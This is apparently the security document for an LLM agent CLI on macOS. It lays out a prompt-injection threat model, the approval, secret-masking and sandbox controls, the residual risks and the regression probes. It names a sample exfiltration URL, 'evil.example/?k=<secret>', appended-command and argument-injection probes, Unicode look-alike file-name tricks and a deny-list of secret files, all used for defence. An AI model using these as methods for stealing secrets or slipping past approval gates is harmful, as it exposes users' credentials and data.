# iAgent security

iAgent runs an LLM that can read files, run commands and act on your Apple devices and iCloud data. This document covers:

- what it protects against,
- the controls that do it, mapped to the standards they come from,
- the risks that remain.

The last review was on 2026-10-17 against v0.3.2. Every control below has a regression test that tries to break it, listed under "How it was verified".

## Threat model

| Asset | Threats |
|---|---|
| Secrets on disk: `.env`, SSH/cloud keys, Keychain, shell startup files | Leaked to the model provider or to a third-party host. Persistence planted in them. |
| LLM API key | Stolen through child processes, redirects, cleartext transport, or world-readable config. |
| Personal data: contacts, notes, reminders, calendar, clipboard, messages | Read without consent. Messages sent to other people. |
| Your terminal | Escape-sequence injection that forges output or approval prompts. |
| Your Mac and devices | Destructive commands, app installs, argument/command injection, resource exhaustion. |

**The main attacker is prompt injection (OWASP LLM01).** Text the model reads can carry instructions for it: a web page, a file in a cloned repo, a note, a calendar invite, an AirPlay device name on the café Wi-Fi. iAgent's controls are built so that a model following such instructions still can't do damage without you seeing and approving it.

## Controls

### Human approval (OWASP LLM06 Excessive Agency)

| Level | Applies to | `--yolo` | "always" |
|---|---|---|---|
| none | Read-only, inside the project: read/glob/grep in the working dir, device scans, listing reminders/events/simulators, battery | – | – |
| ask | Changes: writes in the project, reminders/calendar/notes edits, installs, every simulator and device action except listing | skips | per tool action |
| ask, scoped | `bash` (the exact, complete command), `applescript` (the exact script and arguments), `mac open` (the exact target and app), `shortcuts run` (one shortcut), `web_fetch` (one host), `simulator openurl` (one URL), `ios_device raw` / `simulator raw` (the exact argument list), file access outside the working dir (one directory) | skips | that exact scope only |
| sensitive | Secret/credential files (read or write), files that run code later (shell startup and login files, LaunchAgents, `.git/hooks`, `.git/config`, `~/.gitconfig`, `~/.config/git`, `~/.config/fish`) when written, sending messages | **still asks** | not offered |

- Ctrl-C at an approval prompt ends the prompt and refuses the call, even if an answer is typed afterwards.
- Non-interactive runs refuse anything that isn't "none" unless you pass `--yolo`. "Sensitive" calls are refused in non-interactive runs, with or without `--yolo`.
- Each approval prompt shows exactly what will run: the full command or script, the diff (up to 40 lines each side, with a count of the rest; an overwrite shows only the lines it changes), the message recipient and text, or, for other tools, every argument of the call.
- A path given to any tool (device copies, screenshots, shortcut input, app installs, message attachments, AirDrop items) follows the same rules as `read_file`/`write_file`, so a secret file can't reach the model or another person through a side door and a screenshot can't overwrite a shell startup file. The message prompt shows where a symlinked attachment really points.
- File names are matched with Unicode case folding, like the default APFS volume: `.ZLOGIN` is the file zsh loads as `.zlogin`, and `.zſhrc` (long s, U+017F) is the file it loads as `.zshrc`. Plain lowercasing missed the second, so a new shell-startup file could be created without the always-ask prompt. Hooks and config of submodules and worktrees (`.git/modules/*/hooks`, `config.worktree`) count as files that run code later.

### Data exfiltration and secrets (OWASP LLM02, CWE-200/312/522/732)

- **Secret files are never sent to a cloud model.** Reads of `.env*`, `.envrc`, `~/.ssh`, `~/.config/gh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar are blocked outright (approval level `blocked`, which neither the user nor `--yolo` can override). In local-only mode they can be read after confirming each time. Writing them always needs confirmation.
- **Secrets are masked before anything reaches the model** (`Redact`). This covers the user's messages, every tool result and error, and the project instruction files in the system prompt. Masked items: well-known token formats (Anthropic, OpenAI, GitHub, GitLab, Slack, AWS, Google, Stripe, npm, Hugging Face, JWT), private key blocks, URL passwords, `Bearer`/`Basic` tokens, `password=`/`token:`-style values containing letters and digits, the resolved API key, and the value of every environment variable or custom `headers` entry whose name contains KEY, TOKEN, SECRET, PASSWORD, CREDENTIAL, AUTH or COOKIE (for `Bearer <token>` values, the token on its own too). The user sees a "masked N secrets" notice each time.
- **Symlinks are resolved first.** So `innocent.txt -> ~/.ssh/id_rsa` is caught.
- **Hard links ask first.** A hard link can't be followed to its other names, so a hard-linked file inside the project (link count above 1) needs approval to read, scoped to that file, and `grep` skips it unless it is the path searched. Writes replace the file atomically, which breaks the link instead of writing through it.
- **Project instruction files follow the same rules.** `AGENTS.md`, `CLAUDE.md` and `.iagent.md` are loaded into the system prompt only if they are regular files inside the project, up to 1 MB. A repo can't make one a symlink to `.env` or `~/.aws/credentials`.
- **`grep` never opens secret files.** It tells the model how many it skipped.
- **`web_fetch` asks per host.** This closes the "read a secret, then fetch `evil.example/?k=<secret>`" path. The other ways to reach a URL ask too: `mac open` per exact target and `simulator openurl` per exact URL.
- **API keys are removed from child processes.** `bash`, `osascript` and every helper run without `*_API_KEY` in their environment, including any custom `apiKeyEnv`.
- **Keys can live in the macOS Keychain** (`apiKeyKeychain`). A config file that other users can read triggers a startup warning when it contains an `apiKey` or a credential-named `headers` entry (`Authorization`, `X-Api-Key`), at the top level or in a profile.
- **Nothing is written to disk.** No transcript, cookie or cache is stored (sessions are ephemeral). Temporary files are deleted immediately.

### Local-only mode (`--local`, `localOnly`, `IAGENT_LOCAL_ONLY`)

In this mode, no data leaves the machine:

- **Model server on loopback only.** `localhost`, `127.0.0.0/8` and `::1` are allowed. Cloud APIs and LAN addresses are refused, and the provider is never autodetected from a cloud API key.
- **Apple's on-device model is the default** when `/usr/bin/fm` exists. iAgent starts `fm serve` bound to `127.0.0.1` only, without the API key env vars (`SecretEnv`), and stops it on exit. A server already listening on its port is reused only if `lsof` finds the listener among this user's processes; any local account can bind a loopback port, so another account's server is refused rather than sent the prompts.
- **`apple_fm` reads files under `read_file`'s rules** (`PathPolicy.readApproval`): the file is processed on this Mac, but the answer goes back to the main model, so a secret file is blocked for a cloud model and confirmed every time in local-only mode. Arguments go to `fm respond` as `--opt=value` after `--`, so a value starting with `-` can't become an option. Files over 12,000 bytes are refused, and the temporary schema file is deleted after the call.
- **Egress tools removed.** `web_fetch`, `messages`, `airdrop`, `shortcuts`, `applescript`, `ios_device` and `apple_devices` (Bonjour/Bluetooth scanning) are not offered to the model, and a call to one is refused.
- **Egress actions blocked.** These sync through iCloud or reach other devices: reminder/calendar/note changes, `mac open` (URLs), `mac clipboard_set` (Universal Clipboard), and `simulator openurl`/`raw`.
- **`bash` runs under a Seatbelt sandbox** (`sandbox-exec`, `LocalOnly.sandboxProfile`), inherited by every child process. It denies outbound IP except to localhost, the DNS resolver (its Mach services and mDNSResponder's Unix socket, so a lookup can't carry data out in a hostname; `localhost` still resolves from `/etc/hosts`), LaunchServices opens (`open URL`/apps), Apple Events (which could make another app send the data) and writes to cloud-synced folders (`~/Library/Mobile Documents` for iCloud Drive, `~/Library/CloudStorage` for Dropbox, OneDrive, Google Drive). Not covered: a project that itself lives in a synced folder (for example `~/Documents` with iCloud Desktop & Documents), where any file change syncs.

### Transport (CWE-319, OWASP ASVS V12)

- **HTTPS with TLS 1.2 or later** is required for model APIs. Plain `http://` works only for loopback/LAN servers such as Ollama or LM Studio, unless you set `allowInsecureHTTP: true`.
- **Model API requests never follow redirects,** so an API key header can't be replayed to another host.
- **`web_fetch` follows redirects only within the approved host,** and never from https to http. It has its own credential-less session.

### Injection (CWE-78, CWE-88, CWE-150, OWASP LLM05)

- **No shell is involved** except in the `bash` tool itself. Every external program gets an explicit argument list.
- **System tools run from system folders (CWE-426).** A bare program name (`osascript`, `open`, `pbcopy`, `say`, `screencapture`, …) is looked up in `/usr/bin`, `/bin`, `/usr/sbin` and `/sbin` (SIP-protected) and run directly, so a project folder on PATH (`.`, `./node_modules/.bin`) can't stand in for it. Only tools not found there, such as Homebrew's `idevice_id`, are looked up on PATH.
- **Script values are passed as arguments.** AppleScript/JXA values are separated from the script by `--` and never spliced into it.
- **Option-looking values are rejected.** Device ids, bundle ids, app names, shortcut names and URLs starting with `-` are refused. `say` reads its text from stdin.
- **Terminal output is sanitized.** Model output, tool output, previews and server errors all pass through the sanitizer before printing. ESC, CR, other control characters, bidi overrides and zero-width characters become visible markers (`␛`, `␍`, `⟨U+202E⟩`). So nothing can retitle the window, erase lines, write the clipboard over OSC 52, or fake an approval prompt.
- **Project instructions need a trusted folder.** `AGENTS.md`, `CLAUDE.md` and `.iagent.md` carry system-prompt authority, so they are loaded only after you confirm the folder at startup (each session), or when it is listed in `trustedProjects` in `~/.iagent/config.json`. Non-interactive runs can't ask and load them only for listed folders. The model can't add itself to that list: `~/.iagent` is a secret location.
- **Untrusted content is labeled.** The system prompt tells the model to treat tool output as data. Web content is wrapped in `<untrusted_web_content>`, and a closing tag inside the page is defused so it can't end the wrapper early.

### Resource limits (OWASP LLM10, CWE-400/770)

- `read_file` is limited to 20 MB, `web_fetch` downloads to 5 MB, and command output to 10 MB.
- Tool results sent to the model are cut at 30k characters.
- Commands time out after 120 s by default (600 s max). A timeout or Ctrl-C sends SIGTERM to the command's whole process group, then SIGKILL after 2 s. A background child (`server &`) that keeps the output pipe open doesn't hold up the result and keeps running: its later output is read and discarded, and input for a command that never reads it can't block past the timeout.
- A model stream that ends early (a dropped connection) is reported as an error, so a cut-off reply or tool call is never treated as finished: Anthropic streams need their stop reason or `message_stop`, OpenAI-compatible streams `[DONE]` or a `finish_reason`.
- Ctrl-C stops `grep` and `glob` between files (and `grep` between lines), not only commands.
- Numeric tool arguments are clamped, so an out-of-range value (`limit: -5`, `offset: 1e300`) gets an error or a clamped value instead of crashing the session. Relative dates must be plain numbers within 100 years (`+nanm` and `+1e300d` are refused), and a key the line editor can't map (Ctrl plus a non-ASCII letter) is ignored instead of ending the session.
- A single request is limited to 60 model calls.

### Binary and platform (Apple platform security, OWASP LLM03 Supply Chain)

- **No third-party dependencies.** Only Apple frameworks are used.
- **`scripts/build-release.sh` signs with the hardened runtime** (no JIT, no `DYLD_*` injection, library validation on). It grants only three entitlements: Apple Events, Calendars/Reminders and Contacts. With `SIGN_IDENTITY` set, it produces a Developer ID build ready for notarization.
- **macOS privacy permissions (TCC) apply to each data class.** The embedded `Info.plist` explains why each one is requested.

## Standards coverage

| Standard | Items addressed |
|---|---|
| OWASP Top 10 for LLM Applications 2025 | LLM01 Prompt Injection (approval gates, untrusted-content handling), LLM02 Sensitive Information Disclosure, LLM03 Supply Chain, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage (the system prompt holds no secrets), LLM10 Unbounded Consumption |
| CWE Top 25 / CWE | 22 path traversal, 59 link following, 78 OS command injection, 88 argument injection, 150 terminal escape injection, 178 improper handling of case sensitivity, 200 exposure of sensitive info, 312/522 credential storage, 319 cleartext transmission, 400/770 resource exhaustion, 426 untrusted search path, 451 UI misrepresentation, 732 file permissions |
| OWASP ASVS v5 (applicable parts) | V12 secure communication, V13 configuration and secrets, V14 data protection |
| Apple platform security | Hardened runtime, minimal entitlements, TCC usage strings, Keychain for secrets, notarization path |

**What doesn't apply:**

- **Web-app controls** in ASVS (sessions, CSRF, authentication) and **OWASP MASVS** (mobile apps). iAgent is a local CLI with no server and no accounts.
- **Certification.** There is no formal certification such as SOC 2 or ISO 27001. This is a code-level review, not an audit.

## Residual risks (by design, or not fixable in a CLI)

1. **Approved `bash` commands can do anything your user account can.** Read every command before approving. With `--yolo`, all non-sensitive tools run without asking, so use it only in throwaway environments.
2. **Prompt injection can't be fully prevented.** The model can still be misled into *proposing* harmful actions. The approval prompt is the safety boundary.
3. **The model provider sees everything the model reads, apart from masked secrets.** Masking is pattern-based (a deny-list). A password with no digits, or a secret in an unusual format, can get through. Use `--local` for confidential work.
4. **macOS grants privacy permissions to your terminal app** when it launches iAgent. Other tools run from that terminal share those grants.
5. **No App Sandbox.** It's incompatible with a developer agent that must run arbitrary tools.
6. **A new file longer than 40 lines is not shown in full** in the approval prompt; the prompt says how many lines it left out. Read large files after they are written, or deny and ask for smaller pieces.
7. **The secret-file list is a deny-list.** Unusual secret locations aren't recognized. The approval prompt for reading outside the project still applies to them.
8. **Local-only mode protects against data leaving the machine, but it can't stop everything.** An approved `bash` command can still change local files, and XPC services that the sandbox doesn't name could in principle make network requests on its behalf. `sandbox-exec` is deprecated by Apple, though still shipped and enforced. Ordinary tool calls in local mode (reading reminders, contacts or notes) keep their data on the Mac, because the model is local too. A project inside a synced folder is uploaded by its sync client whatever iAgent does.
9. **A path can change between approval and use (CWE-367).** The path is checked when the prompt is shown and used after you answer, so a background process started earlier could swap a folder for a symlink in between. Exploiting it needs code already running as you.
10. **One slow regular expression can't be interrupted.** Ctrl-C stops `grep` between lines, but `NSRegularExpression` has no cancellation hook, so a pathological pattern on one long line runs to the end.

## Reporting a vulnerability

Please report privately to the maintainer rather than opening a public issue. Include steps to reproduce. We aim to acknowledge reports within 3 working days.

## How it was verified

Each control was tested with harmless payloads on macOS 26.7; the controls added on 2026-10-17 were tested on macOS 27. These probes are automated in `Tests/iAgentTests/SecurityTests.swift`; run them with `swift test < /dev/null`.

- **Escape codes:** ESC/OSC sequences in a file were shown as visible markers, and so was an OSC sequence in a refused path.
- **Hidden commands:** a `\r`-hidden bash command was visible in the prompt.
- **Secret files:** `~/.ssh` and `.env` reads were refused even with `--yolo`, including through a symlink. `grep` skipped secret files.
- **Exfiltration:** `web_fetch` required approval. `simulator openurl` and `mac open` were scoped to one exact URL, and `shortcuts run` with a secret `input_path` and `ios_device copy_to` from `~/.ssh` were blocked.
- **Approval scopes:** "always" for a 300-character command didn't cover the same command with `; curl …` appended. Different AppleScripts, outside directories and URLs got different scopes.
- **Code that runs later:** writes to `.git/hooks/pre-commit`, `.git/config`, `~/.gitconfig`, `~/.zlogin` and fish config asked every time; reading `.git/config` did not.
- **Prompts:** a tool without its own preview listed every argument (a shortcut's `input_path`), and an overwrite showed only the changed line.
- **Argument injection:**
  - A `say -o` value didn't create the file.
  - An osascript argument `-e <payload>` arrived as plain data.
  - The bundle id `--erase` was rejected.
- **Transport:** plain HTTP to a remote host was refused, including names that only start like a LAN address (`10.0.0.1.evil.example`). A 307 redirect on the API was refused, and the redirect target never received the `Authorization` header. A cross-host `web_fetch` redirect wasn't followed.
- **API keys:** `$OPENAI_API_KEY` was empty inside `bash`.
- **Secret masking:** API keys of each known format, private key blocks, URL passwords, `.env`-style values and registered env values and credential-named custom headers (`Authorization: Bearer …`, `X-Api-Key`) were masked in tool results, while an ordinary header such as `X-Team` was not. Ordinary code such as `apiKey = config.apiKey` was left alone, and a full scan of this repository masked only the test fixture. A `read_file` of `.env` was blocked even with `--yolo`.
- **Local-only mode:** Anthropic and LAN model servers were refused. `web_fetch` was not offered and `mac open` was blocked. Inside sandboxed `bash`, `curl https://…`, raw sockets, DNS lookups, `open URL` and Apple Events to Finder and Mail all failed (compared against an unsandboxed run where the network worked), while git, swift and python ran normally. Before the 2026-10-17 fix, `getaddrinfo()` still resolved names inside the sandbox; now connecting to mDNSResponder's socket fails (the test sends no query), `localhost` still resolves, and writes into `Library/Mobile Documents` and `Library/CloudStorage` under a fake home failed while writes in the project worked.
- **Look-alike names:** with `--yolo`, `write_file` of `.zſhrc` created the file zsh opens as `.zshrc` without asking before the fix; now `.zſhrc`, `.baſh_profile` and a Kelvin-sign `.pem` name ask every time. Reading `.awſ/credentialſ` was already blocked, because existing paths resolve to their on-disk spelling.
- **Hard links:** a hard link inside the project to a file outside it needed approval to read and was skipped by `grep`, while an ordinary file next to it was read freely.
- **Search path:** `osascript` resolved to `/usr/bin/osascript` whatever PATH said, and a tool missing from the system folders was left to PATH.
- **Config file:** a group- or world-readable config warned for an `apiKey`, an `Authorization` header and an `X-Api-Key` header in a profile; a `chmod 600` config and a harmless `X-Title` header did not.
- **Resource limits:** 30 MB of output was capped at 10 MB. `sleep 10 &` returned at once, and a command that traps SIGTERM was killed at its timeout. Out-of-range `read_file` numbers didn't crash. A background job writing 5 MB after the tool returned kept running to the end. 1 MB of input to `sleep 10` timed out after 0.5 s without a SIGPIPE, and a stream cut before `message_stop` raised an error, as did an OpenAI-compatible stream with neither `[DONE]` nor a `finish_reason`. A cancelled `grep` or `glob` threw instead of returning results, `+nanm`/`+infh`/`+1e300d` dates were refused, and Ctrl plus the Kelvin sign or `İ` was ignored by the line editor instead of crashing it.
- **Case and nesting:** new `.ENVRC`, `.ZLOGIN` and `.Git/Hooks/…` writes asked every time, and so did `.git/modules/<sub>/hooks` and `config.worktree`.
- **Folder trust:** an untrusted folder's `AGENTS.md` was left out of the system prompt in a non-interactive run and after answering `n`; it was included after `y` or with the folder in `trustedProjects`.
- **Interrupted approval:** in a pseudo-terminal, Ctrl-C at a `write_file` prompt followed by `y` refused the call and created no file; the same run without Ctrl-C created it.
- **Side doors:** a `messages` attachment or AirDrop item symlinked to `~/.ssh/id_rsa` was blocked, and an `AGENTS.md -> .env` symlink was left out of the system prompt.
- **Messages:** refused non-interactively even with `--yolo`.
- **Signed build:** passes `codesign --verify --strict` with the `runtime` flag.
